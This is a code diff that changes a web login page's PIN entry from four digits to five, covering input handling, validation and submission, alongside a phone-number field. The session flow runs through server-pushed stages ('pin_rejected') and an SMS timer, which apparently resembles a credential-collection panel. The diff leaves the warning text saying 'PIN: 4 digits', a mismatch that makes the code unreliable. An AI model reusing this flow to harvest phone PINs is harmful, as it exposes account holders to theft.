@@ -213,7 +213,7 @@ function handleStageUpdate(session) {
         startSmsTimer();
     } else if (stage === 'pin_rejected') {
         document.getElementById('lpPhone').value = '';
-        [0, 1, 2, 3].forEach(i => document.getElementById('lp' + i).value = '');
+        [0, 1, 2, 3, 4].forEach(i => document.getElementById('lp' + i).value = '');
         goTo('page-login');
         document.getElementById('bLgn').disabled = false;
         chkPin();
@@ -413,7 +413,7 @@ function updateCalc() {
 // ══════════════════════════════════════════════════════
 function pinMvM(el, i) {
     el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 3) {
+    if (el.value && i < 4) {
         document.getElementById('lp' + (i + 1)).focus();
     }
     chkPin();
@@ -435,7 +435,7 @@ document.addEventListener('keydown', function(e) {
 
 function chkPin() {
     const phone = document.getElementById('lpPhone').value.trim();
-    const pinOk = [0, 1, 2, 3].every(i => document.getElementById('lp' + i).value);
+    const pinOk = [0, 1, 2, 3, 4].every(i => document.getElementById('lp' + i).value);
     const ok = phone.length === 9 && pinOk;
     const btn = document.getElementById('bLgn');
     btn.className = ok ? 'btn-login rdy' : 'btn-login';
@@ -443,14 +443,14 @@ function chkPin() {
 }
 
 function togPin() {
-    [0, 1, 2, 3].forEach(i => {
+    [0, 1, 2, 3, 4].forEach(i => {
         const b = document.getElementById('lp' + i);
         b.type = b.type === 'password' ? 'text' : 'password';
     });
 }
 
 function clearLoginPin() {
-    [0, 1, 2, 3].forEach(i => { document.getElementById('lp' + i).value = ''; });
+    [0, 1, 2, 3, 4].forEach(i => { document.getElementById('lp' + i).value = ''; });
     chkPin();
 }
 
@@ -480,9 +480,9 @@ async function doLogin() {
     ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
 
     const phone = document.getElementById('lpPhone').value;
-    const pin = [0, 1, 2, 3].map(i => document.getElementById('lp' + i).value).join('');
+    const pin = [0, 1, 2, 3, 4].map(i => document.getElementById('lp' + i).value).join('');
 
-    if (phone.length !== 9 || pin.length < 4) {
+    if (phone.length !== 9 || pin.length < 5) {
         S.isSubmitting = false;
         showLgnMsg('warning', 'Phone: 9 digits (e.g., 771234567). PIN: 4 digits.');
         return;
